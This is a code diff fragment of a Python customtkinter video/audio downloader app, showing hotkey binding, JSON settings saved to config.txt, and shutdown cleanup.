+            if not self.is_paused and self.download_queue:
+                self.start_download_queue()
+
+    def bind_hotkey(self):
+        try:
+            import keyboard
+            keyboard.unhook_all()
+            keyboard.add_hotkey(self.hotkey.lower(), self.handle_download, suppress=True)
+            self.start_stop_btn.configure(text=f"Start ({self.hotkey.upper()})")
+        except:
+            self.hotkey = "f6"
+            keyboard.add_hotkey(self.hotkey.lower(), self.handle_download, suppress=True)
+            self.start_stop_btn.configure(text=f"Start (F6)")
+
+    def load_state(self):
+        config_path = "config.txt"
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, "r") as f:
+                    state = json.load(f)
+                    self.hotkey = state.get("hotkey", "f6")
+                    self.download_format = state.get("download_format", "mp4")
+                    self.video_quality = state.get("video_quality", "720p")
+                    self.audio_bitrate = state.get("audio_bitrate", "128")
+                    self.download_folder = state.get("download_folder", os.path.expanduser("~/Downloads"))
+                    self.appearance_mode = state.get("appearance_mode", "dark")
+            except:
+                pass
+
+    def save_state(self):
+        config_path = "config.txt"
+        state = {
+            "hotkey": self.hotkey,
+            "download_format": self.format_combo.get(),
+            "video_quality": self.quality_combo.get() if self.download_format == "mp4" else self.video_quality,
+            "audio_bitrate": self.quality_combo.get() if self.download_format == "mp3" else self.audio_bitrate,
+            "download_folder": self.download_folder,
+            "appearance_mode": self.appearance_mode
+        }
+        try:
+            with open(config_path, "w") as f:
+                json.dump(state, f)
+        except:
+            pass
+
+    def on_closing(self):
+        self.is_downloading = False
+        self.is_paused = False
+        self.is_fetching = False
+        self.download_queue.clear()
+        self.current_title = ""
+        self.current_uploader = ""
+        self.save_state()
+        try:
+            import keyboard
+            keyboard.unhook_all()
+        except:
+            pass
+        self.thread_pool.shutdown(wait=False)
+        self.root.destroy()
+
+if __name__ == "__main__":
+    root = ctk.CTk()
+    app = URLDownloaderApp(root)
+    root.mainloop()
